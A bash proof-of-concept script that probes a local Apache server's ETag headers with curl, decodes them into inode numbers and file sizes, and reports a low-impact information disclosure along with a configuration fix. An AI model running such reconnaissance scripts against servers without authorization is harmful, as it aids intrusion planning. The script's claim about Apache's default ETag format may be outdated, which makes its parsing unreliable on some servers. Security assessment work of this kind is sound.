#!/bin/bash

# POC: ETag Header Information Disclosure - Inode and File Metadata Leakage
# This script demonstrates how Apache's default ETag format leaks file system metadata

TARGET="http://localhost:8080"
echo "=========================================="
echo "ETag Information Disclosure POC"
echo "=========================================="
echo ""
echo "Target: $TARGET"
echo ""

# Test multiple endpoints to show consistent pattern
ENDPOINTS=("/" "/styles.css" "/scripts.js")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "----------------------------------------"
    echo "Testing: ${TARGET}${endpoint}"
    echo "----------------------------------------"
    
    # Fetch headers
    RESPONSE=$(curl -s -I "${TARGET}${endpoint}" 2>&1)
    
    if [ $? -ne 0 ]; then
        echo "⚠ Warning: Failed to connect to ${TARGET}${endpoint}"
        echo ""
        continue
    fi
    
    # Extract ETag
    ETAG=$(echo "$RESPONSE" | grep -i "^ETag:" | awk '{print $2}' | tr -d '\r\n"')
    
    # Extract Content-Length
    CONTENT_LENGTH=$(echo "$RESPONSE" | grep -i "^Content-Length:" | awk '{print $2}' | tr -d '\r\n')
    
    # Extract Last-Modified
    LAST_MODIFIED=$(echo "$RESPONSE" | grep -i "^Last-Modified:" | cut -d' ' -f2- | tr -d '\r\n')
    
    if [ -n "$ETAG" ]; then
        echo "✓ ETag Found: $ETAG"
        
        # Parse ETag pattern (format: "inode-size-mtime" or variations)
        if [[ "$ETAG" =~ ^([0-9a-f]+)-([0-9a-f]+) ]]; then
            INODE_HEX="${BASH_REMATCH[1]}"
            SIZE_HEX="${BASH_REMATCH[2]}"
            
            # Convert hex to decimal
            INODE_DEC=$((16#$INODE_HEX))
            SIZE_DEC=$((16#$SIZE_HEX))
            
            echo "  └─ Inode Number: 0x$INODE_HEX = $INODE_DEC (decimal)"
            echo "  └─ File Size: 0x$SIZE_HEX = $SIZE_DEC bytes"
            
            if [ -n "$CONTENT_LENGTH" ]; then
                echo "  └─ Content-Length: $CONTENT_LENGTH bytes"
                if [ "$SIZE_DEC" -eq "$CONTENT_LENGTH" ]; then
                    echo "  └─ ⚠ VERIFIED: ETag size matches Content-Length (confirming inode leak pattern)"
                fi
            fi
            
            if [ -n "$LAST_MODIFIED" ]; then
                echo "  └─ Last-Modified: $LAST_MODIFIED"
            fi
            
            echo ""
            echo "🔴 VULNERABILITY CONFIRMED: ETag leaks file system metadata"
            echo "   - Inode number exposed: $INODE_DEC"
            echo "   - File size exposed in ETag format"
            echo "   - This is Apache's default ETag format: inode-size-mtime"
        else
            echo "  └─ ETag format does not match typical Apache inode pattern"
            echo "  └─ May be using custom ETag configuration"
        fi
    else
        echo "✗ No ETag header found"
    fi
    
    echo ""
done

echo "=========================================="
echo "Summary"
echo "=========================================="
echo ""
echo "The ETag header is disclosing file system metadata including:"
echo "  • Inode numbers (reveals file system structure)"
echo "  • File sizes in hexadecimal"
echo "  • Modification timestamps"
echo ""
echo "Recommendation: Configure Apache with 'FileETag MTime Size' to remove inode"
echo ""
echo "Security Impact: LOW"
echo "  - Assists in reconnaissance and information gathering"
echo "  - May reveal deployment patterns and file system layout"
echo "  - In shared hosting, could leak information about other tenants"
echo "=========================================="